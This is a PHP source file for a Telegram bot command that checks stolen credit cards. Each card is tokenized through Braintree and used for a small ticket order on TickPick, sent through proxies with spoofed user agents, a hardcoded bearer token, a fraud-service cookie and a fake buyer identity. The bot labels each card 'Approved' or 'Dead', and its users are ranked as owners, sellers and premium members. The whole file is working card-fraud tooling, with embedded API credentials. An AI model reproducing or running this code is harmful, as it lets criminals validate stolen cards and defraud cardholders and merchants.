<?php

include('rnd-ua.php');

$pChkU = $isAdmin ? "Owner" : (in_array($user['id'], $f_data['premiuns']) ? "Premiun" : "Free");
if(in_array($user['id'], $sellers)){
$pChkU = "Seller";
}

$proxy = "🇺🇸 - Live!";
$gate = "𝙄𝙩𝙖𝙘𝙝𝙞";
$charged = "$4";
//1req
$sid = "f4f2b264-20a9-4a23-bedb-0ebab80eeba8";
//2req
$fcoki = "bfbdcb84aa6c433b9b748b2a5f841d0e_1682988483953_1731_dUAL43b-mnts-a9-d4_15ck";
$bearer = "Bearer 7Lpik0o-pV9eY46cWfuwlwdStQ6Lh41uuRvgOoKGQ5Ol3xBHnjhsgrnlFstKXxyutnZ3CbazdyobNyt6sf2Ak2NYYPEFx_a0cVJFFACxsPiNKjNKfnkvX1nQvVGQWgBSZg1SvL_vf0XdlRA9nU8gk1vVjk5mLOU76IFUaGhYJWbcpq2sXKMY6L7QlWKk0uSlwxlWSCAVJfcWYUMgi9hP-qyBkv7nCeo1an7rpkisTx5jLN7zdarO0-p-Z9vpqGIdstly9QcQIP6WUt4sxUpFCdU_Mr3hM9GLwQmWyMfFoep4ZTdWHEYFe4G54090OpjiPkxmUh7cdLCXHXlqn2ulJJTP9X9c7y3ttC10ipVPRFG6o3DUQIWKHpZmAGgEwTsS1IbHCmnW5aVkxQXICWmYXQ";
$retry = 0;
//CHK Gate1
if(cCmd($msg['text'], ['/it', '/It', '/iT', '/IT', '!it', '!It', '!iT', '!IT', '.it', '.IT', '.iT', '.IT']) && -1001821890401){
	$eMsg = explode(' ', $msg['text']);
	$cEMsg = count($eMsg);
	$cBin = cBin($eMsg[1]);
	$antiSpam = TRUE;
	include('accs-as.php');
	
if($cEMsg == 1){
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️ -» <code>".$charged."</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/it cc|month|year|cvc</code>",
'reply_to_message_id' => $msg['message_id']
]);
	}
else{
$msgId_bot = output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...",
'reply_to_message_id' => $msg['message_id']
])['result']['message_id'];

include('cc-analyzer.php');

if($cc == false || $month == false || $year == false || $cvv == false){
include('cc-errors.php');
}
else{
start:
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>⚪️</code>"
]);
/*=====  Gate  ======*/
$num = rand(1000, 9999);
$coki = uniqid();
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://payments.braintree-api.com/graphql");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: payments.braintree-api.com',
'content-type: application/json',
'user-agent: '.$rnd_ua.'',
'authorization: Bearer production_x6w6kf6s_s9c92qms9spb3drw',
'braintree-version: 2018-05-10'
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$sid.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) { token creditCard {   bin   brandCode   last4   binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId   } }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$month.'","expirationYear":"'.$year.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$r1 = curl_exec($ch);
$token = capture($r1, '"token":"','"');
if(empty($token)){
$retry++;
goto start;
}
include('cc-data.php');
/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "https://api.tickpick.com/1.0//orders");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.tickpick.com',
'forter-token-cookie: '.$fcoki.'',
'client-platform: dmob',
'authorization: '.$bearer.'',
'user-agent: '.$rnd_ua.'',
'content-type: application/json',
'accept: */*',
'origin: https://www.tickpick.com',
'referer: https://www.tickpick.com/'
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"event_id":"5447876","inventory_id":"1969737885","inventory_type":"TP","inhand_date":"2023-05-19T00:00:00","section":"GEN ADM","row":"GA","notes":"XFER","mapped_section":"GA","quantity":1,"unit_price":3,"tax_amount":0,"promo_discount":0,"credit_discount":0,"buyer_credit_boost_total":0,"payment_fee":0,"delivery_type":13,"insurance_offer":{"package_id":"X3KV6-RD4DH-INS","quotes":[{"quote_id":"ae3fcd55-2e13-4fd6-8a21-a6e7b49cb9f4","price":0.21,"customer_opted_for_quote":false,"coverage_type":"EventTicketProtection"}]},"attribution_info":{"utm_medium":"direct"},"payment_info":{"method":"CC","credit_card":{"nonce":"'.$token.'"}},"customer":{"customer_id":"m_kajwk900wk@gmail.com","email":"m_kajwk900wk@gmail.com","billing_address":{"street_address":"118 W 132nd St","street_address2":"","city":"New York","state":"New York","zip":"10027","country":"US"},"name":"Sachio YT","phone":"","shipping_address":{"street_address":"118 W 132nd St","street_address2":"","city":"New York","state":"New York","zip":"10027","country":"US"}},"fb_conversion":{"user_data":{},"event_source_url":"https://www.tickpick.com/checkout?listingId=1969737885&quantity=1&listingType=TP&price=3&dt=f&dv=13&e=5447876&s=GA"},"recent_order_acknowledged":false,"message_subscriptions_request":{"message_subscriptions":[{"subscription_action":"Subscribe","message_type":"MarketingSMS"}]}}');
$r2 = curl_exec($ch);
$time = substr(curl_getinfo($ch)['total_time'], 0, 4)."'s";
curl_close($ch);
$msg1 = capture($r2, '"return_code":"','"');
if(empty($msg1)){
$retry++;
goto start;
}
$msg2 = capture($r2, '"message":"[',']');
$msg3 = capture($r2, '"['.$msg2.'] ','"');
$message = '"return_code":"'.$msg1.'","message":"['.$msg2.'] '.$msg3.'"';

if($msg2 == "error-payment-declined"){
$msg4 = capture($r2, '"['.$msg2.'] payment has been declined. reason [',']"');
}
if($msg2 == "error-expired-cc"){
$msg7 = capture($r2, '['.$msg2.'] ','"');
}
if($msg2 == "error-invalid-cc"){
$msg8 = capture($r2, '"['.$msg2.'] ','"');
}
if($msg2 == "error-forter"){
$msg6 = capture($r2, '"['.$msg2.'] error calling forter [[',']');
}
if($msg2 == "error-general"){
$msg5 = capture($r2, '"['.$msg2.'] ','"');
}

if($msg2 == "fraud-block" || $msg6 == "fraud-block"){
$status = "Approved! ✅ -» Charged!";
$status1 = "Success -» ".$charged."";
}
elseif($msg4 == "Insufficient Funds"){
$status = "Approved! ✅ -» Cvv";
$status1 = "Insufficient Funds";
}
elseif($msg3 == "Card Issuer Declined CVV"){
$status = "Approved! ✅ -» Ccn";
$status1 = "Card Issuer Declined CVV";
}
elseif($msg2 == "error-payment-declined"){
$status = "Dead! ❌";
$status1 = "$msg4";
}
elseif($msg2 == "error-expired-cc"){
$status = "Dead! ❌";
$status1 = "$msg7";
}
elseif($msg2 == "error-invalid-cc"){
$status = "Dead! ❌";
$status1 = "$msg8";
}
elseif($msg2 == "error-general"){
$status = "Dead! ❌";
$status1 = "$msg5";
}
elseif($msg2 == "error-forter" || $msg2 == "error-server-error"){
$retry++;
goto start;
}
else{
$status = "Dead! ❌";
$status1 = "$msg2";
}

if($retry > 4){
$status = "Waos! ⛈";
$status1 = "Max Retry!";
}

output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>✨</code>"
]);

$rChk = "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>".$status."</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$status1."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>";
}
}
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => $rChk
]);